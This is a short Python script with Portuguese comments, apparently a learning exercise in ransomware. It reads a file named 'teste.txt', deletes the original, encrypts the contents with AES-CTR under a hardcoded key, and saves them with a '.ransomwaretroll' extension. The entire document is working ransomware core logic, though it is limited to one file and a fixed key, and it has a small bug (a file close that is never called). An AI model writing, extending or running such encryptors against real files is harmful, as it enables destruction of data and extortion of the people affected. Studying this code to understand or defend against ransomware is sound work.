import os
import pyaes

## ABRINDO O ARQUIVO QUE SERÁ CRIPTOGRAFADO

file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close

## REMOVENDO O ARQUIVO ORIGINAL

os.remove(file_name)

## DEFININDO A CHAVE DE ENCRIPTAÇÃO

key = b'testeransomwares' #16 caracteres necessários para a chave
aes = pyaes.AESModeOfOperationCTR(key) #Função utilizada para criptografar o arquivo com base na chave passada

## CRIPTOGRAFANDO O ARQUIVO

crypto_data = aes.encrypt(file_data)

## SALVANDO O ARQUIVO CRIPTOGRAFADO

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()


